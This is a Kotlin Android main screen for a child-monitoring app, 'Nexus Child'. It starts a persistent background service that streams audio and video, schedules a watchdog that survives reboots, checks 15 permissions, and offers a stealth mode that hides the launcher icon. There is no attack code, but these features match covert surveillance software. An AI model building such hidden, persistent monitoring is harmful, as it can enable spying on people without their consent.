package com.nexus.child

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.lifecycleScope
import androidx.lifecycle.repeatOnLifecycle
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.nexus.child.components.applock.AppLockActivity
import com.nexus.child.components.applock.AppLockManager
import com.nexus.child.components.applock.AppLockSetupActivity
import com.nexus.child.components.stealth.StealthController
import com.nexus.child.databinding.ActivityMainBinding
import com.nexus.child.permission.PermissionGuideActivity
import com.nexus.child.permission.PermissionHelper
import com.nexus.child.permission.PermissionManager
import com.nexus.child.service.NexusBackgroundService
import com.nexus.child.service.scheduler.PersistentJobService
import com.nexus.child.service.watchdog.WatchdogService
import com.nexus.child.webrtc.AuthManager
import com.nexus.child.webrtc.DeviceIdManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * MainActivity serves as the tactical dashboard for the Nexus Child monitoring agent.
 *
 * Hey friend! Here is how this presentation layer operates in our production architecture:
 * 1. Clean Separation of Concerns: MainActivity NO LONGER holds WebRTC or hardware controller lifecycles.
 *    All background operations, WebRTC signaling, audio/video streaming, and command handlers
 *    run continuously inside NexusBackgroundService.
 * 2. Background Service Trigger: When MainActivity launches, it ensures NexusBackgroundService is running
 *    and registers the persistent 15-minute watchdog with PersistentJobService.
 * 3. Reactive StateFlow Observation: Observes NexusBackgroundService.isConnected using repeatOnLifecycle
 *    to display real-time connection status (LED indicator & status text).
 * 4. Device Identifier Management: Asynchronously retrieves or formats the persistent 12-digit Child ID
 *    and provides one-tap clipboard copying.
 * 5. Lifecycle Independence: If the child leaves the app or closes MainActivity, the background service
 *    remains completely active in the foreground notification area without interruption!
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
    }

    private lateinit var binding: ActivityMainBinding
    private lateinit var stealthController: StealthController
    private var rawDeviceId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Security Gatekeeper: Check if App Lock is active before rendering UI
        val skipLockCheck = intent.getBooleanExtra(AppLockActivity.EXTRA_SKIP_LOCK_CHECK, false)
        if (!skipLockCheck && AppLockManager.isAppLockEnabled(this) && !AppLockManager.isSessionUnlocked()) {
            Log.d(TAG, "App Lock is enabled and session locked; redirecting to AppLockActivity")
            AppLockActivity.start(this)
            finish()
            return
        }

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        stealthController = StealthController(this)

        setupHeaderBadges()
        setupDeviceIdCard()
        setupPermissionsCard()
        setupStealthCard()
        setupAppLockCard()

        // 1. Start the persistent continuous Foreground Service (which manages WatchdogService)
        NexusBackgroundService.start(this)

        // 2. Schedule the persistent JobScheduler watchdog to survive reboots asynchronously off main thread
        lifecycleScope.launch(Dispatchers.IO) {
            PersistentJobService.schedule(applicationContext)
        }

        // 3. Populate device ID asynchronously
        loadDeviceIdentifier()

        // 4. Reactively observe live connection state and device ID from the background service
        observeConnectionState()
    }

    override fun onResume() {
        super.onResume()
        // Refresh permissions status counter when returning from system settings
        refreshPermissionsStatus()
        // Refresh stealth status badge & button text
        refreshStealthStatusUi()
        // Refresh App Lock status badge & button text
        refreshAppLockStatusUi()
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MainActivity destroyed. NexusBackgroundService continues running in the background.")
    }

    /**
     * Resolves the persistent 12-digit Child ID and displays the formatted representation.
     * Uses active service value if already available, or queries DeviceIdManager safely under Mutex lock.
     */
    private fun loadDeviceIdentifier() {
        // Fast path: if the background service has already resolved the device ID, display it immediately
        val existingActiveId = NexusBackgroundService.deviceId.value
        if (!existingActiveId.isNullOrBlank()) {
            rawDeviceId = existingActiveId
            binding.textDeviceId.text = DeviceIdManager.format(existingActiveId)
            Log.d(TAG, "Device ID immediately available from active service: $existingActiveId")
            return
        }

        binding.textDeviceId.text = getString(R.string.status_connecting)

        lifecycleScope.launch {
            try {
                // Ensure Firebase is anonymously authenticated first
                AuthManager.ensureAuthenticated(this@MainActivity)

                // Retrieve or generate unique 12-digit Device ID (guarded by coroutine Mutex)
                val id = DeviceIdManager.getOrGenerateDeviceId(this@MainActivity)
                rawDeviceId = id

                // Format as "XXXX XXXX XXXX" for comfortable visual reading
                val formattedId = DeviceIdManager.format(id)
                binding.textDeviceId.text = formattedId
                Log.d(TAG, "Device ID ready for display: $id ($formattedId)")
            } catch (e: Exception) {
                Log.e(TAG, "Error loading device ID: ${e.message}", e)
                binding.textDeviceId.text = getString(R.string.status_disconnected)
            }
        }
    }

    /**
     * Collects live connection status and device ID updates from NexusBackgroundService
     * while the activity is in the STARTED lifecycle state.
     */
    private fun observeConnectionState() {
        lifecycleScope.launch {
            repeatOnLifecycle(Lifecycle.State.STARTED) {
                // Observe connection state changes
                launch {
                    NexusBackgroundService.isConnected.collect { isConnected ->
                        updateConnectionStatusUi(isConnected)
                    }
                }

                // Observe Device ID resolution from the background service
                launch {
                    NexusBackgroundService.deviceId.collect { liveDeviceId ->
                        if (!liveDeviceId.isNullOrBlank() && rawDeviceId != liveDeviceId) {
                            rawDeviceId = liveDeviceId
                            binding.textDeviceId.text = DeviceIdManager.format(liveDeviceId)
                            Log.d(TAG, "Device ID updated from background service: $liveDeviceId")
                        }
                    }
                }
            }
        }
    }

    /**
     * Updates the status LED indicator and status text label based on live connection state.
     */
    private fun updateConnectionStatusUi(isConnected: Boolean) {
        if (isConnected) {
            binding.indicatorStatusLed.setBackgroundResource(R.drawable.status_led_active)
            binding.textConnectionStatus.text = getString(R.string.status_connected)
            binding.textConnectionStatus.setTextColor(
                ContextCompat.getColor(this, R.color.status_connected)
            )
        } else {
            binding.indicatorStatusLed.setBackgroundResource(R.drawable.status_led_inactive)
            binding.textConnectionStatus.text = getString(R.string.status_ready)
            binding.textConnectionStatus.setTextColor(
                ContextCompat.getColor(this, R.color.text_primary)
            )
        }
    }

    /**
     * Sets up the tactical metadata badge in the top header.
     */
    private fun setupHeaderBadges() {
        binding.badgeTargetDevice.text = PermissionHelper.getDeviceModelBadge()
    }

    /**
     * Configures the Device Identifier display and one-tap clipboard copy action.
     */
    private fun setupDeviceIdCard() {
        binding.btnCopyDeviceId.setOnClickListener {
            val idToCopy = rawDeviceId ?: binding.textDeviceId.text.toString().replace(" ", "")
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText("Nexus Device ID", idToCopy)
            clipboard.setPrimaryClip(clip)

            Toast.makeText(this, R.string.device_id_copied, Toast.LENGTH_SHORT).show()
        }
    }

    /**
     * Binds click events and initial state for the Permissions summary card.
     */
    private fun setupPermissionsCard() {
        binding.btnOpenPermissions.setOnClickListener {
            PermissionGuideActivity.start(this)
        }

        refreshPermissionsStatus()
    }

    /**
     * Evaluates all 15 system permissions and updates counts and button states.
     */
    private fun refreshPermissionsStatus() {
        val grantedCount = PermissionManager.getGrantedCount(this)
        val totalCount = PermissionManager.getTotalCount()
        val allGranted = PermissionManager.areAllGranted(this)

        binding.textPermissionsStatus.text = getString(
            R.string.permission_status_format,
            grantedCount,
            totalCount
        )

        if (allGranted) {
            binding.iconPermissionsCard.setImageResource(R.drawable.ic_shield_check)
            binding.iconPermissionsCard.setColorFilter(
                ContextCompat.getColor(this, R.color.status_connected)
            )
            binding.btnOpenPermissions.text = getString(R.string.btn_permissions_complete)
        } else {
            binding.iconPermissionsCard.setImageResource(R.drawable.ic_shield)
            binding.iconPermissionsCard.setColorFilter(
                ContextCompat.getColor(this, R.color.text_primary)
            )
            binding.btnOpenPermissions.text = getString(R.string.btn_configure_permissions)
        }
    }

    /**
     * Binds click events and initial state for the Stealth Operation card.
     */
    private fun setupStealthCard() {
        binding.btnToggleStealth.setOnClickListener {
            val isStealth = stealthController.isStealthMode()
            if (isStealth) {
                // If already stealthed, clicking unhides immediately
                stealthController.setStealthMode(false)
                Toast.makeText(this, R.string.toast_stealth_deactivated, Toast.LENGTH_SHORT).show()
                refreshStealthStatusUi()
            } else {
                // If visible, show confirmation dialog before hiding from launcher
                showStealthConfirmationDialog()
            }
        }

        refreshStealthStatusUi()
    }

    /**
     * Updates the stealth status badge and action button label.
     */
    private fun refreshStealthStatusUi() {
        val isStealth = stealthController.isStealthMode()
        if (isStealth) {
            binding.textStealthBadge.text = getString(R.string.stealth_card_badge_hidden)
            binding.textStealthBadge.setTextColor(
                ContextCompat.getColor(this, R.color.status_connected)
            )
            binding.btnToggleStealth.text = getString(R.string.btn_deactivate_stealth)
        } else {
            binding.textStealthBadge.text = getString(R.string.stealth_card_badge_visible)
            binding.textStealthBadge.setTextColor(
                ContextCompat.getColor(this, R.color.text_secondary)
            )
            binding.btnToggleStealth.text = getString(R.string.btn_activate_stealth)
        }
    }

    /**
     * Displays a tactical dialog explaining stealth mode and how to reverse it
     * via the 1x1 widget or parent console.
     */
    private fun showStealthConfirmationDialog() {
        MaterialAlertDialogBuilder(this)
            .setTitle(R.string.stealth_dialog_title)
            .setMessage(R.string.stealth_dialog_message)
            .setPositiveButton(R.string.stealth_dialog_confirm) { dialog, _ ->
                dialog.dismiss()
                val success = stealthController.setStealthMode(true)
                if (success) {
                    Toast.makeText(this, R.string.toast_stealth_activated, Toast.LENGTH_SHORT).show()
                    // Finish activity to immediately return user to home screen where icon has vanished
                    finish()
                } else {
                    refreshStealthStatusUi()
                }
            }
            .setNegativeButton(R.string.stealth_dialog_cancel) { dialog, _ ->
                dialog.dismiss()
            }
            .setCancelable(true)
            .show()
    }

    /**
     * Binds click events and initial state for the App Lock Security card.
     */
    private fun setupAppLockCard() {
        binding.btnConfigureAppLock.setOnClickListener {
            AppLockSetupActivity.start(this)
        }
        refreshAppLockStatusUi()
    }

    /**
     * Updates the App Lock status badge and button label based on active configuration.
     */
    private fun refreshAppLockStatusUi() {
        val isEnabled = AppLockManager.isAppLockEnabled(this)
        val hasPin = AppLockManager.hasPinSet(this)

        if (isEnabled) {
            binding.textAppLockBadge.text = getString(R.string.app_lock_card_badge_enabled)
            binding.textAppLockBadge.setTextColor(
                ContextCompat.getColor(this, R.color.status_connected)
            )
            binding.btnConfigureAppLock.text = getString(R.string.btn_manage_app_lock)
        } else {
            binding.textAppLockBadge.text = getString(R.string.app_lock_card_badge_disabled)
            binding.textAppLockBadge.setTextColor(
                ContextCompat.getColor(this, R.color.text_secondary)
            )
            binding.btnConfigureAppLock.text = if (hasPin) {
                getString(R.string.btn_manage_app_lock)
            } else {
                getString(R.string.btn_configure_app_lock)
            }
        }
    }
}
